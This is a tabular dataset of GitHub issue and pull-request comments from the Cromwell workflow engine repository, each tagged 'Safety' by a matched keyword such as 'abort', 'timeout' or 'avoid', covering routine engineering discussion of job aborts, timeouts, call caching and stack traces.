Safety,@mcovarr I believe comments are addressed modulo the 1 WONTFIX and my statement that I might add some extra unit testing to the old abort code,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-442213519:132,abort,abort,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-442213519,1,['abort'],['abort']
Safety,"@mcovarr I don't *think* so but as I mentioned earlier I wasn't completely buying what jprofiler was selling and need to take a closer look. Also our comparisons shouldn't be hash code based anyways. One thing I did turn up was elsewhere in that file you had been converting some sets to lists to avoid hashes coming out of filters and such, that might be a thing here as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277886109:297,avoid,avoid,297,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-277886109,1,['avoid'],['avoid']
Safety,@mcovarr I investigated as part of the ticket. I wasn't able to recreate the problem but I couldn't see why the option to update the abort function should be disallowed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164849222:133,abort,abort,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164849222,1,['abort'],['abort']
Safety,"@mcovarr I think we still need to ensure that the submission is correct before sending back a 201 with the workflow ID, which means being sure that everything necessary to start executing the workflow is ready (all DB executions succeeded etc...); @kshakir I see your point, however in this case I don't think having the ask timing out is a problem, if a WorkflowActor takes forever to initialize itself then there is actually some bottleneck further down, and it might even be better to say ""sorry but we're really too busy right now, retry later"", than keeping waiting for WorkflowActors, which is going to trigger a timeout anyway since this comes from the ""submit endpoint"" and spray is not going to wait forever either.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161985376:619,timeout,timeout,619,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161985376,1,['timeout'],['timeout']
Safety,@mcovarr I was just thinking that this PR probably warrants careful timing & some coordination to avoid a giant rebase hell for everyone,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232191521:98,avoid,avoid,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1152#issuecomment-232191521,1,['avoid'],['avoid']
Safety,@mcovarr I've left the update enabled but added a new warning. So hopefully it's at least as vocal and warn-y as before but won't outright ignore the updated abort function.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164886510:158,abort,abort,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/326#issuecomment-164886510,1,['abort'],['abort']
Safety,"@mcovarr On top of addressing your comments I added a small migration as I realized it's technically possible for some workflows to be in `RestartableRunning` or `RestartableAborting` when Cromwell starts, which are now replaced by `Running` and `Aborting` with the restarted flag to `true`. If you don't mind re-taking a look at the liquibase :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2829#issuecomment-342570056:247,Abort,Aborting,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2829#issuecomment-342570056,1,['Abort'],['Aborting']
Safety,"@mcovarr Sure. Using the async ref worked for me, such that the tests didn't need to be ignored. FYI, I did run into at least one of our wonderful intermittent timeouts, that disappeared after re-running.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155192304:160,timeout,timeouts,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/277#issuecomment-155192304,1,['timeout'],['timeouts']
Safety,@mcovarr We though develop is in a relative unstable state with all the restructuring going on and that it would be safer to branch off of an earlier version. This commit is the commit that fixed the duplicate inputs bug.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198468069:116,safe,safer,116,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198468069,1,['safe'],['safer']
Safety,"@mcovarr Yeah the reason for this PR is that there is currently a mutable `var` that holds the process when it's created, so it can be accessed by the abort method. I know `var`s are evil but in this case creating an underlying FSM just to get rid of this `var` does seem an overkill to me. I couldn't find a way to use the `BackendJobExecutionActor` itself to encapsulate this mutable state though, which is why I ended up with this. I can give it another shot.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214750391:151,abort,abort,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/734#issuecomment-214750391,1,['abort'],['abort']
Safety,@mcovarr and @kshakir I had to rebase on top of your all's changes so if you could take a closer than usual eye on the abort logic in `CromwellApiService` to make sure I've captured your changes that'd be 💯,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-441837669:119,abort,abort,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4425#issuecomment-441837669,1,['abort'],['abort']
Safety,"@mcovarr can you explain more what this issue is? Alternatively, I can close it and you're welcome to add to the [Abort spec](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1409#issuecomment-324468545:114,Abort,Abort,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1409#issuecomment-324468545,1,['Abort'],['Abort']
Safety,"@mcovarr commented on [Thu Sep 07 2017](https://github.com/broadinstitute/wdltool/issues/48). Per the link below, enhance wdltool to be able to detect malformed expressions. Expressions that can't be evaluated are okay and expected due to values not being available, but malformed expressions are not okay. https://gatkforums.broadinstitute.org/wdl/discussion/10311/error-evaluating-output-files-that-serve-as-input-files-for-following-step#latest",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2869:144,detect,detect,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2869,1,['detect'],['detect']
Safety,"@mwalker174 originally reported:. > Hi all, I’ve got a critical problem where call caching times out on a particular WDL task (`“message”: “Hashing request timed out for gs://...“’). This makes some sense since the task is checking ~200 files on each of ~200 shards. This is on cromwell v36/papiv2. I thinking bundling the files would probably fix this, but is there any way to increase the timeout limit in the server settings? Would upgrading to v38 help? Thanks!. There's currently a non-configurable 5 minute timeout per GCS hash request. Assuming no batching (which I didn't come across) for ~40K individual requests that's about 100 requests/second to GCS. I'm pretty sure w/ GCS request throttling & internal cromwell backoffs at least one of those requests would fail to return in 5 minutes.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4873:391,timeout,timeout,391,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4873,2,['timeout'],['timeout']
Safety,"@ndbolliger I'm guessing this is no longer a problem since it hasn't gotten any attention in 9 months...sorry about that! Closing it out unless anyone objects, we have a [Spec Document for Aborts](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit) now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775#issuecomment-326421477:189,Abort,Aborts,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775#issuecomment-326421477,1,['Abort'],['Aborts']
Safety,"@nickp60 not specifically related to cromwell, but in WDL in general, entrypoints generally should be avoided. Any behaviour you need the task to do should be coded in the task itself. . So if you need `auth.sh` to be run, then in your wdl task you should do:. ```wdl; task a {. command <<<; ./auth.sh; .... other commands here ....; >>>; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5901#issuecomment-702846067:102,avoid,avoided,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5901#issuecomment-702846067,1,['avoid'],['avoided']
Safety,@patmagee It turned out it was a different issue entirely in our production environment that had the symptoms of abort failures. We've not had success recreating this -- but let us know what you end up observing!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-400468311:113,abort,abort,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3758#issuecomment-400468311,1,['abort'],['abort']
Safety,@pgrosu IIRC we use `central` to avoid some of their other large customers in other zones. However note that we *are* one of their large customers so choosing the same zone as us might not be the best plan for success in avoiding preemptions :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267834836:33,avoid,avoid,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267834836,2,['avoid'],"['avoid', 'avoiding']"
Safety,"@pgrosu It's in our internal space, however I can give you the gist. We're doing a few things at once ...; - Make workflow submission async. Submitted workflows go into a new store and the WorkflowManagerActor can pull them as necessary. Within the store they'll be marked as either Submitted, Running or Restartable. The latter is a state which is assigned to any workflow in Running state when the system comes online; - The EngineJobExecutionActor (EJEA above) sits between the WorkflowExecutionActor and the BackendJobExecutionActor, and will manage engine-side knowledge in a persisted store. The combination of this and the above will allow us to bring back what we call the 'restart' functionality - i.e. pick up a running workflow from the engine side but not reattach to running backend jobs; - Less hashed out at the moment, if a backend will support 'recover' functionality (attaching to the backend jobs, we'll implement this in as many of our own backends as we can), the backend will need to manage its own information, e.g. using the KV store",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230605714:862,recover,recover,862,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230605714,1,['recover'],['recover']
Safety,"@ruchim ; As a user, I want to abort a series of workflows by their label. Does not involve JESification at this time.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2333:31,abort,abort,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2333,1,['abort'],['abort']
Safety,"@ruchim @Horneth @aednichols I'm seeing this error pop up running cromwell-35 on SGE, except the timeout is at 60 seconds rather than 10. The error gets repeated a number of times (in the latest log it appears 9 times). The output in question is a glob and there are 80 calls to the task producing it. 2 fastqs get chucked into 20 chunks each, so 40 total. FastQC is run for these chunks once before adapter clipping and once after, so 80 total. There's a bunch of other jobs being run as well, but I'm only seeing this error for this specifc output (`Fastqc.images`). ```; [2018-10-11 13:48:43,66] [error] WorkflowManagerActor Workflow 0a20b0d2-8ad2-43b1-ba92-49e1c39d6578 failed (during ExecutingWorkflowState): cromwell.backend.standard.StandardAsyncExecutionActor$$anon$2: Failed to evaluate job outputs:; Bad output 'Fastqc.images': Futures timed out after [60 seconds]; at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$handleExecutionSuccess$1(StandardAsyncExecutionActor.scala:858); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(Fo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379:97,timeout,timeout,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-428948379,1,['timeout'],['timeout']
Safety,"@ruchim Did ""abort by label"" functionality go into your work on Cromwell 28? If not that's fine, just wanted to check if I should close this or reprioritize.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2333#issuecomment-313467275:13,abort,abort,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2333#issuecomment-313467275,1,['abort'],['abort']
Safety,"@ruchim I'm not sure about the details, we have a monitor script (https://github.com/HumanCellAtlas/pipeline-tools/blob/c6c11a20c91aa360fcd7ca7c28de14b281cabd7b/adapter_pipelines/ss2_single_sample/options.json#L2) running as workflow options besides the actual RSEM tool, which is monitoring the disk space. it outputs:; ```; /cromwell_root/monitoring.sh: line 15: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 17: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 19: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 13: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 15: echo: write error: No space left on device; /cromwell_root/monitoring.sh: line 17: echo: write error: No space left on device; ``` ; but not exit codes. Do you think it's possible to add some error handling to that bash script to let cromwell know the out of space error during the runtime? Even if it's practical to do that, it may still not as safe as the exit code throw by the actual tool. so wait for @jishuxu's response.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4006#issuecomment-417695517:1043,safe,safe,1043,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4006#issuecomment-417695517,1,['safe'],['safe']
Safety,"@ruchim Yes! We eventually switched our particular workflow that motivated this issue to avoid a glob altogether. We really do expect at most one matching file, so this was simpler than pulling it out of an array later.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4004#issuecomment-417386515:89,avoid,avoid,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4004#issuecomment-417386515,2,['avoid'],['avoid']
Safety,@scottfrazer @Horneth Would you all feel safer if this was left until after s/g is merged in before merging being merged?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-136401514:41,safe,safer,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-136401514,1,['safe'],['safer']
Safety,"@scottfrazer So the reason I'm asking about the required functionality and JES (and asked if the main issue was the eventual annoying rebase if this isn't merged) is that my concern is that this is a hefty change mid-sprint when we're already concerned w/ the hairiness of our actual sprint goals. For instance what if this causes some unforeseen issue which causes the s/g to not be complete this sprint. We can handwave all we want about what is truly important or not but the only official metric of importance is what's in our sprint and if this disrupts that's no bueno - and regardless of our confidence level there _is_ a risk here. I suppose we could back it out but that'd still likely end up having been a big time disruption at that point. I would feel a lot more comfortable if a large body of WDL was run against JES backend (and Local too, really - though that's less worrisome) - it'd have been nice if someone decided the integration test battery was important enough to work on the side ;) If people have actually been listening to my requests to paste their interesting WDLs on that ticket that'd be a good start, but double check with @cjllanwarne as he wrote a WDL to exercise all the various functionality we supported at the time. . Actually what'd be really awesome is if you could run the WDL they're using for the demo as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134756661:629,risk,risk,629,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134756661,1,['risk'],['risk']
Safety,"@scottfrazer is currently rebasing on top of @cjllanwarne's abort merge, if you merge now he'll need to rebase again on top of this. Maybe we can wait to get the factory mergable/merged to rebase this one ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/743#issuecomment-216323662:60,abort,abort,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/743#issuecomment-216323662,1,['abort'],['abort']
Safety,"@seandavi Gotcha, this might be another case of ""frightening log message"" if you were detecting it via cromwell, although IIRC we squelched those specifically as they were too spammy.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645342:86,detect,detecting,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645342,1,['detect'],['detecting']
Safety,@seandavi Thanks. One could say though that we're not adhering to one of the tenets of distributed computing which is to make sure everything you do has some reasonable timeout where you give up and assume its dead :),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260527835:169,timeout,timeout,169,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260527835,1,['timeout'],['timeout']
Safety,@seandavi are you still interested in being able to limit CPU and memory when running on local? ; @geoffjentry what would be the effort and risk for adding these parameters?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333241117:140,risk,risk,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-333241117,1,['risk'],['risk']
Safety,"@vsoch if you've not already done that, we can always reopen this PR. You all are right, I'm wrong. The reason why I was leaning towards avoiding `cromwell.examples.conf` blurbs is that (as @TMiguelT points out) it's a bit of a mess right now due to having too much stuff in there. TBH work needs to be done to start making that more organized. I sometimes can lean towards throwing the baby out with the bathwater in circumstances like that. I think it's fine to put a number of configurations into `cromwell.examples.conf` as long as the full block is fairly well self contained, and well documented. IOW something which would be easy to peel out into a separate file if/when we get there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468965389:137,avoid,avoiding,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468965389,1,['avoid'],['avoiding']
Safety,@xuf12 thank you for your contribution and for your interest in Cromwell. We merged our changeset in PR https://github.com/broadinstitute/cromwell/pull/5567 so I'm going to go ahead and close this one since it is now redundant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5564#issuecomment-656253905:217,redund,redundant,217,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5564#issuecomment-656253905,1,['redund'],['redundant']
Safety,"@yfarjoun -- can you give a little more context on this? These jobs will just fail upon localization right? or does something else happen that you want to avoid?. Completing this sentence ""this is important because ..."" would be a good formula!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231626677:155,avoid,avoid,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1137#issuecomment-231626677,1,['avoid'],['avoid']
Safety,"A 503 StorageException seems to have failed one of the centaur JES jobs, and hence the workflow. Via the [cromwell.log](https://console.cloud.google.com/storage/browser/cloud-cromwell-dev/cromwell_execution/travis/centaur_workflow/0310fa51-e985-4c54-8cdb-5058155f452e/call-centaur/cromwell_root/logs/). ```java; 2017-08-25 05:43:25,399 cromwell-system-akka.dispatchers.engine-dispatcher-51 ERROR - WorkflowManagerActor Workflow dabddbe7-a385-4df4-be97-c1ef7b884823 failed (during ExecutingWorkflowState): Could not evaluate composeEngineFunctions.y = read_int(stderr()) + x + read_string(blah); java.lang.RuntimeException: Could not evaluate composeEngineFunctions.y = read_int(stderr()) + x + read_string(blah); 	at wdl4s.wdl.WdlTask$$anonfun$4.applyOrElse(WdlTask.scala:190); 	at wdl4s.wdl.WdlTask$$anonfun$4.applyOrElse(WdlTask.scala:189); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at scala.util.Failure.recoverWith(Try.scala:232); 	at wdl4s.wdl.WdlTask.$anonfun$evaluateOutputs$2(WdlTask.scala:189); 	at scala.collection.TraversableOnce.$anonfun$foldLeft$1(TraversableOnce.scala:157); 	at scala.collection.TraversableOnce.$anonfun$foldLeft$1$adapted(TraversableOnce.scala:157); 	at scala.collection.Iterator.foreach(Iterator.scala:929); 	at scala.collection.Iterator.foreach$(Iterator.scala:929); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1417); 	at scala.collection.IterableLike.foreach(IterableLike.scala:71); 	at scala.collection.IterableLike.foreach$(IterableLike.scala:70); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableOnce.foldLeft(TraversableOnce.scala:157); 	at scala.collection.TraversableOnce.foldLeft$(TraversableOnce.scala:155); 	at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104); 	at wdl4s.wdl.WdlTask.evaluateOutputs(WdlTask.scala:182); 	at cromwell.backend.wdl.OutputEvaluator$.evaluateOutputs(OutputEvaluator.scala:15); 	at cromwell.backend.stan",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2576:949,recover,recoverWith,949,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2576,1,['recover'],['recoverWith']
Safety,A batch endpoint to abort workflows,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3753:20,abort,abort,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3753,1,['abort'],['abort']
Safety,"A better design (which maybe requires a JES ask) is to have JES report back _exactly_ what was uploaded. Then there will be no uncertainty, no timeouts and no issues with eventual consistency being to eventual.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1395#issuecomment-256933084:143,timeout,timeouts,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1395#issuecomment-256933084,1,['timeout'],['timeouts']
Safety,"A bunch of jobs were finished which Cromwell didn't detect. The context: ; - Trying to run jprofiler to get a profile of the run described in #820. Full stack dump:. ```; Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.60-b23 mixed mode):. ""cromwell-system-akka.actor.default-dispatcher-27"" #115 prio=5 os_prio=31 tid=0x00007fb76d052800 nid=0xf503 waiting on condition [0x0000000135d74000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0021d00> (a akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""ForkJoinPool-3-worker-5"" #82 daemon prio=5 os_prio=31 tid=0x00007fb76cc73800 nid=0xcd03 waiting on condition [0x0000000134661000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0041f30> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""pool-1-thread-20"" #81 prio=5 os_prio=31 tid=0x00007fb76cc5b800 nid=0xcb03 waiting on condition [0x000000013455e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(Th",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:52,detect,detect,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,2,"['Unsafe', 'detect']","['Unsafe', 'detect']"
Safety,A cleanly shut down Cromwell instance cleans up the workflow store to null out the Cromwell instance ID field for the workflow store entries it was running. When a new Cromwell instance comes up it will consider those workflow store entries to be fair game for pickup because those instance ID fields are null. However an uncleanly shut down Cromwell does not null out the Cromwell instance ID field of its running workflows before it exits. When a new Cromwell instance comes up it will see that those workflow store entries appear to be owned by another Cromwell and will only pick them up if the heartbeats on those rows are older than the workflow heartbeat TTL (default 10 minutes). . The problem here was some vestigial logic for the way restarts used to work that no longer makes sense in the 2/3-implemented horizontal Cromwell system. It is now entirely reasonable to see workflows in Running or Aborted state with or without a heartbeat timestamp depending on whether the Cromwell that was previously running those workflows was shut down cleanly or not.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3675:905,Abort,Aborted,905,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3675,1,['Abort'],['Aborted']
Safety,"A collaborator from DSP had pointed me to increasing the option by changing the variable:; ```services.MetadataService.config.metadata-read-row-number-safety-threshold = 1000000```; and then, after Googling it, I did see that example. But I could not find an explanation of that variable in the documentation. :-)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650:151,safe,safety-threshold,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6236#issuecomment-813646650,1,['safe'],['safety-threshold']
Safety,"A couple of separate ""belt-and-braces"" fixes to BW-478 which allowed errors in job preparation engine execution to leave workflows stuck in a zombie/Running/""call Starting"" state:. * Stop the engine function itself from throwing an exception; * Put a safety catch in the Job Execution actor to catch any other exceptions thrown by engine functions; * Put a safety catch in the `ErrorOr` `flatMap` function to automatically catch any exception thrown in `for`-comprehension chains.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6161:251,safe,safety,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6161,2,['safe'],['safety']
Safety,A different approach to #1126 from that proposed in the ticket. This records the container ID at `docker run` time and uses that to `docker kill` the process on abort.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2581:161,abort,abort,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2581,1,['abort'],['abort']
Safety,"A few observations:; - If the EJEA is aborted, we could stop hashing the remaining files; - If the EJHA is done, it could stop hashing the remaining files; - Since the EJHA already blocks work into chunks of 100 (and BackendFileHashers tend to be synchronous), it could simply not send the next batch if it knows it doesn't need to; - If the set of initial hashes are a cache miss (and cache writing is disabled), we don't need to send the files for hashing in the first place",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1503:38,abort,aborted,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1503,1,['abort'],['aborted']
Safety,"A few workflows that we aborted in Cromwell-as-a-Service have the status ""Aborted"" (e.g. ""429e0aaf-c429-4438-a12d-734f1f444801"") but the subworkflow that was running when the parent workflow was aborted is still in the ""running"" status. When trying to abort the subworkflow that is still running (""34074359-f8ed-4402-ba65-c92ab550e999""), I see the error:. ```; {; ""status"": ""error"",; ""message"": ""Couldn't abort 34074359-f8ed-4402-ba65-c92ab550e999 because no workflow with that ID is in progress""; }; ```. It looks like Cromwell thinks the workflow is not running, but it's metadata says that it is.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3654:24,abort,aborted,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3654,5,"['Abort', 'abort']","['Aborted', 'abort', 'aborted']"
Safety,A new centaur test has been added based on an existing one (`cwl_prefix_for_array`) that was from a previous example CWL of mine 😄 . Looks like whatever was causing that timeout didn't recur this go around.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525940334:170,timeout,timeout,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5143#issuecomment-525940334,1,['timeout'],['timeout']
Safety,"A partial implementation of the WES 1.0 standard directly embedded in the Cromwell server (modulo auth, but that's another story altogether). Why partial? Because I wanted to keep PR sizes down and didn't want to be rebasing every 3 days. Also this lays the basic infrastructure, so might as well get commentary on that. It's not hurting anything to have a partial implementation. Why status & abort? Because they were the easiest to do.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4425:394,abort,abort,394,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4425,1,['abort'],['abort']
